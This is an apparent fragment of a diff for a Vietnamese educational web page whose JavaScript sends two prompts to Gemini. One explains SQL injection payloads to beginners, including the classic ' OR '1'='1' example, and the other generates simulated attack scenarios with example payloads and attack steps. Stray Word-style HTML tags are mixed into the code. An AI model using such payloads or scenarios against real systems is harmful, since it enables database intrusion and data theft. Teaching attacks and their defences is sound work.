+    analyzeButton.addEventListener('click', () => {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        const payload = payloadInput.value.trim();</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        if (!payload) {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            payloadOutput.innerText = 'Vui lòng nhập một payload để phân tích.';</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            return;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+ 
+
+        const prompt = `
+
+            Bạn là một chuyên gia an ninh mạng. Phân tích đoạn mã SQL Injection payload sau đây: "${payload}".
+
+            Hãy giải thích một cách chi tiết nhưng dễ hiểu cho người mới học:
+
+            1.  **Mục đích của payload:** Kẻ tấn công đang cố gắng làm gì?
+
+            2.  **Loại tấn công:** Đây là loại SQL Injection nào (ví dụ: Union-based, Boolean-based, Error-based)?
+
+            3.  **Cách hoạt động:** Giải thích từng phần của payload (ví dụ: ' OR '1'='1' là gì, -- có tác dụng gì).
+
+            4.  **Cách phòng chống:** Biện pháp hiệu quả nhất để vô hiệu hóa loại tấn công này là gì?
+
+            Trình bày câu trả lời bằng tiếng Việt, sử dụng Markdown.
+
+        `;
+
+        callGemini(prompt, payloadOutput, payloadLoader, analyzeButton);
+
+    });
+
+ 
+
+    scenarioButton.addEventListener('click', () => {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        const businessType = scenarioSelect.value;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        const prompt = `</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            Bạn là một chuyên gia viết kịch bản an ninh mạng. Hãy tạo một kịch bản tấn công SQL Injection giả lập, thực tế nhắm vào một hệ thống "${businessType}".
+
+            Kịch bản phải bao gồm các mục sau, trình bày rõ ràng bằng tiếng Việt và sử dụng Markdown:
+
+            - **Mục tiêu của Kẻ tấn công:** (Ví dụ: Đánh cắp dữ liệu thẻ tín dụng, chiếm tài khoản quản trị).
+
+            - **Điểm yếu (Vulnerable Parameter):** (Ví dụ: Tham số \`productID\` trên URL, trường tìm kiếm không được lọc).
+
+            - **Payload được sử dụng:** (Cung cấp một ví dụ về payload mà kẻ tấn công có thể dùng).
+
+            - **Quy trình Tấn công (Từng bước):** (Mô tả các bước kẻ tấn công thực hiện).
+
+            - **Hậu quả Kinh doanh (Business Impact):** (Mô tả thiệt hại về tài chính, danh tiếng).
+
+        `;
+
+        callGemini(prompt, scenarioOutput, scenarioLoader, scenarioButton);
+
+    });
+
+</script>
+
+ 
+
+</body>
+
+</html>
